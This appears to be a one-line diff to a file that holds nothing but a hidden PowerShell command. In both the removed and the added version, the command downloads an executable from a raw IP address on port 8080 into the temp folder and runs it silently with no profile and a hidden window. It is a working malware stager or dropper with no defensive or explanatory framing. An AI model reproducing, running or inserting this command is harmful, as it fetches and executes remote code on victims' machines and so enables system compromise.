@@ -1,1 +1,1 @@
-powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\jGhOQmKh.exe')"; (new-object System.Net.WebClient).DownloadFile('http://95.111.250.209:8080/KmTdIXITha0HJ', $z); invoke-item $z
+powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\5JNXkhJI.exe')"; (new-object System.Net.WebClient).DownloadFile('http://95.111.250.209:8080/ah58nt5s5bznuC', $z); invoke-item $z
